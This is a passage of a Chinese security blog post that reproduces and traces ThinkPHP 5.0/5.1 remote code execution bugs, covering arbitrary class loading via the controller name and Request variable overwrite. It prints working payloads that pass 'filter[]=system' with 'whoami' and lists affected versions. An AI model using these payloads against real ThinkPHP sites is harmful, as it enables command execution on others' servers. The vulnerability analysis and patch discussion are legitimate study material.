+<p>除了数字字母都不能进去。然后看看官方公众号发的<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">更新说明</a>，更新后的版本是 V5.1.31 和 V5.0.23，这次复现也去看前面的版本</p>
+<blockquote>
+<h3 id="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0和5-1版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由"><a href="#本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0和5-1版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由" class="headerlink" title="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由"></a>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的<code>getshell</code>漏洞，受影响的版本包括<code>5.0</code>和<code>5.1</code>版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由</h3></blockquote>
+<p>这次也是先不跟 poc，先用正常的路由跟进去看看是怎么个情况。在 commit 更新处打上断点，新增控制器：<code>A.php</code>（大写）</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Cache</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token double-quoted-string string">"Welcome!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>然后访问 <code>http://127.0.0.1/PHPSec/tpdemo/public/index.php/index/a/b</code> （方便分析），命中断点</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210804165532.png" alt="image-20210804165531770"></p>
+<p>一路跟下来，来到 <code>App.php</code> 的 432 行（第一次会跳过），跟进 <code>run()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210804165709.png" alt="image-20210804165709210"></p>
+<p>来到关键点：    <code>exec()</code>，跟进</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210804165751.png" alt="image-20210804165751779"></p>
+<p>在实例化容器处跟进</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804170058.png" alt="image-20210804170058452"></p>
+<p>继续跟 <code>parseModuleAndClass()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804170147.png" alt="image-20210804170147377"></p>
+<p>解析模块，如果含有 <code>\</code> 则直接返回，本次没有反斜杠，来到 653 行，跟进 <code>parseClass()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804170216.png" alt="image-20210804170216410"></p>
+<p>跟进 <code>parseName（）</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804170411.png" alt="image-20210804170411450"></p>
+<p><code>parseName（）</code>将字符串转为 驼峰命名</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804170624.png" alt="image-20210804170624647"></p>
+<p>接着将 命名空间与模块名拼接返回</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804170911.png" alt="image-20210804170911631"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804171000.png" alt="image-20210804171000268"></p>
+<p>然后就是判断类是否存在，并加载它</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804171115.png" alt="image-20210804171115598"></p>
+<p>能看出来，整个过程没有检测路径，可以考虑到任意类加载</p>
+<p>直接访问 <code>http://127.0.0.1/PHPSec/tpdemo/public/index.php/index/think\app/index</code>，chrome会将反斜杠转为正斜杠，因为这是Windows文件路径的作用，且RFC 2396根本不允许URL中使用该字符(因此，与该字符有关的任何行为都只是错误恢复行为)。</p>
+<p>那不就没办法加载其他类了？nonono，看 tp 配置文件，默认未开启强制路由</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804172106.png" alt="image-20210804172105921"></p>
+<p>所以可以这样：<code>http://127.0.0.1/PHPSec/tpdemo/public/index.php/?s=/index/think\app/index</code>，成功加载了 <code>think\App</code> 类</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804172237.png" alt="image-20210804172237341"></p>
+<p>所以此漏洞可以利用命名空间调用任意类，形如：<code>http://127.0.0.1/PHPSec/tpdemo/public/index.php?s=/index/namespace\class/method</code></p>
+<p>payload：<code>http://127.0.0.1/PHPSec/tpdemo/public/index.php/?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</code></p>
+<p>一路跟下来关键点在 <code>\thinkphp\library\think\route\dispatch\Module.php!exec()</code> 第135 行 <code>$data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</code> 此处反射调用</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804175226.png" alt="image-20210804175225977"></p>
+<p>跟进去</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804175238.png" alt="image-20210804175238812"></p>
+<p>然后在 <code>thinkphp\library\think\Request.php!input()</code> 第1376 行进行过滤</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804175323.png" alt="image-20210804175323059"></p>
+<p>过滤调用了我们指定的 <code>system()</code>，达到想要的结果</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210804175423.png" alt="image-20210804175423192"></p>
+<p>攻击总结：</p>
+<p><img src="https://raw.githubusercontent.com/Mochazz/ThinkPHP-Vuln/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="总结"></p>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>增加正则表达式 <code>^[A-Za-z](\w)*$</code> ，对控制器名进行合法性检测</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3570">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
+<h1 id="RCE-3-核心类-Request-变量覆盖导致-RCE"><a href="#RCE-3-核心类-Request-变量覆盖导致-RCE" class="headerlink" title="RCE 3 ( 核心类 Request 变量覆盖导致 RCE )"></a>RCE 3 ( 核心类 Request 变量覆盖导致 RCE )</h1><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞是由于 ThinkPHP 底层未对控制器名进行很好的检测导致在未开启强制路由的情况下可以调用任意类及方法</p>
+<p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p>
+<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>5.0.13 的未验证</p>
+<pre class="line-numbers language-none"><code class="language-none"># ThinkPHP &lt;= 5.0.13
+POST /?s=index/index
+s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system
+
+# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug
+POST /
+_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami
+
+# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha
+POST /?s=xxx HTTP/1.1
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>测试版本：5.0.23</p>
+<p>本次版本是 <strong>5.0.23</strong>，所以去看看<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases/tag/v5.0.24"> 5.0.24 releases </a>的说明，接着去看其 commit ，发现 <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003"><strong>改进Request类</strong></a> 的改动，增加了对 <code>$method</code> 的判断</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805110156.png" alt="image-20210805110154073"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805110255.png" alt="image-20210805110255156"></p>
+<h3 id="开启-app-debug"><a href="#开启-app-debug" class="headerlink" title="开启 app_debug"></a>开启 app_debug</h3><p>上一个 POC 跟着调试一波 url：<code>http://127.0.0.1/PHPSec/tp5.0/public/index.php</code> ，POST：<code>_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</code>，在代码改动处打上断点</p>
+<p>命中断点，跟进</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805133913.png" alt="image-20210805133911896"></p>
+<p>来到 poc 的 构造函数，此处判断属性是否存在然后直接覆盖变量</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805134034.png" alt="image-20210805134034204"></p>
+<p>一路走到 <code>App.php!run()</code> 的126 行，记录路由和请求信息处，跟进<code>$request-&gt;param()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805134712.png" alt="image-20210805134712582"></p>
+<p>在跟进 <code>method()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805135302.png" alt="image-20210805135302251"></p>
+<p>继续跟 <code>server()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805135351.png" alt="image-20210805135351937"></p>
+<p>这里最后调用了 <code>input()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805135535.png" alt="image-20210805135535400"></p>
+<p>跟进来后发现只有执行的命令，执行命令的函数没了，别急，接着往下走</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805135634.png" alt="image-20210805135634117"></p>
+<p>重点就在这一段，先跟 <code>getFilter()</code> 获取过滤器名</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805135712.png" alt="image-20210805135712203"></p>
+<p>在 1064 行由于 filter 原本是空的所以赋值为我们开始时构造函数覆盖的变量，也就是 <code>system</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805135836.png" alt="image-20210805135836775"></p>
+<p>然后来到 1034 行：<code>$this-&gt;filterValue($data, $name, $filter);</code>，跟进去，成功执行命令</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805140159.png" alt="image-20210805140159040"></p>
+<p>总结攻击流程：</p>
+<p><img src="https://raw.githubusercontent.com/Mochazz/ThinkPHP-Vuln/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/12.png" alt="总结"></p>
+<h3 id="未开启-app-debug"><a href="#未开启-app-debug" class="headerlink" title="未开启 app_debug"></a>未开启 app_debug</h3><blockquote>
+<p>如果 poc 返回 404 的话应该是没安装验证码模块，执行 <code>composer require topthink/think-captcha=1.*</code>即可</p>
+</blockquote>
+<p>POC：<code>http://127.0.0.1/PHPSec/tp5.0/public/?s=captcha</code> POST：<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></p>
+<p>看调用堆栈，后面和开启 debug 一样，不多哔哔，不同的是前面触发点是在 <code>App.php!run() --&gt; exec()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805152054.png" alt="image-20210805152051030"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805152243.png" alt="image-20210805152243807"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805152538.png" alt="image-20210805152538131"></p>
+<p>现在的问题是怎么把 <code>$dispatch['type']</code> 的值 为 <code>controller/method</code>，向上回溯可以发现 <code>$dispatch</code> 在 <code>App.php</code> 的 116 行赋值，跟进去</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805154318.png" alt="image-20210805154318230"></p>
+<p>然后在 648 行检测路由处跟进</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805154402.png" alt="image-20210805154402630"></p>
+<p>然后到 <code>Route.php!check()</code> 的 887 行，路由规则检测 跟进</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805154524.png" alt="image-20210805154523957"></p>
+<p>964 行 <code>checkRule()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805154602.png" alt="image-20210805154602730"></p>
+<p>1203 行 <code>parseRule()</code></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805154631.png" alt="image-20210805154631052"></p>
+<p>这个函数里的判断直接定义了 <code>type</code> 的值，<code>$route</code> 里面是有 反斜杠 的，所以进到第三个分支里面</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805154733.png" alt="image-20210805154733173"></p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805154823.png" alt="image-20210805154823782"></p>
+<blockquote>
+<p>那第四个怎么进去呢？<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/118037"><strong>ThinkPHP5</strong> 中支持 <strong>5种</strong> 路由地址方式定义</a>：</p>
+<table>
+<thead>
+<tr>
+<th>定义方式</th>
+<th>定义格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>方式1：路由到模块/控制器</td>
+<td>‘[模块/控制器/操作]?额外参数1=值1&amp;额外参数2=值2…’</td>
+</tr>
+<tr>
+<td>方式2：路由到重定向地址</td>
+<td>‘外部地址’（默认301重定向） 或者 [‘外部地址’,’重定向代码’]</td>
+</tr>
+<tr>
+<td>方式3：路由到控制器的方法</td>
+<td>‘@[模块/控制器/]操作’</td>
+</tr>
+<tr>
+<td>方式4：路由到类的方法</td>
+<td>‘\完整的命名空间类::静态方法’ 或者 ‘\完整的命名空间类@动态方法’</td>
+</tr>
+<tr>
+<td>方式5：路由到闭包函数</td>
+<td>闭包函数定义（支持参数传入）</td>
+</tr>
+</tbody></table>
+<p>捣鼓一会发现都失败了。。。菜如狗</p>
+</blockquote>
+<p>安装验证码模块之后，在 <code>vendor\topthink\think-captcha\src\helper.php</code> 中定义了 验证码 的路由。程序初始化会自动加载  <code>vendor</code> 目录下的文件，所以可以直接利用这个路由进到第三个 if 里面</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805161007.png" alt="image-20210805161007518"></p>
+<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>对请求方法 <strong>$method</strong> 进行白名单校验，其只能为 <code>['GET', 'POST', 'DELETE', 'PUT', 'PATCH']</code> 中的一个</p>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/PHPSec/20210805161327.png" alt="image-20210805161327014"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>三个 RCE 分析下来很舒服，可以直接感受到 代码审计 的魅力，也很敬佩前辈写的 POC 及分析文章，实在巧妙，而我只会 tql</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">yq1ng</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://yq1ng.github.io/2021/07/28/php-dai-ma-shen-ji-tp5-lou-dong-rce/">http://yq1ng.github.io/2021/07/28/php-dai-ma-shen-ji-tp5-lou-dong-rce/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">yq1ng</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/">
+                                    <span class="chip bg-color">...</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'T5NQswoTdP1lIQoMWGjuCIW8-gzGzoHsz',
+        appKey: 'Plcqv1j5VkAV6ByH7KDT6HFB',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'xiaoxin',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '欢迎师傅斧正'
+    });
+</script>
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/08/02/ctfshow-zu-jian-lou-dong-zhuan-ti/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="CTFshow--组件漏洞专题">
+                        
+                        <span class="card-title">CTFshow--组件漏洞专题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            [TOC]
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-02
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF%E5%88%B7%E9%A2%98/" class="post-category">
+                                    CTF刷题
+                                </a>
+                            
+                            <a href="/categories/ctfshow/" class="post-category">
+                                    ctfshow
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/">
+                        <span class="chip bg-color">...</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/23/php-dai-ma-shen-ji-tp5-lou-dong-sql-zhu-ru-fen-xi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="[PHP代码审计]TP5漏洞--Sql注入分析">
+                        
+                        <span class="card-title">[PHP代码审计]TP5漏洞--Sql注入分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            试着审计PHP，网上大师傅们分析的都很好，我就不班门弄斧了，仅记录复现过程（不推荐跟踪学习），学习审计思路。
+贴几个师傅的链接，环境搭建、详细分析可以去看看
+七月火师傅
+标题的xxx注入只是随便起的，不一定只有那一个，举个栗子而已
+环境搭建
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
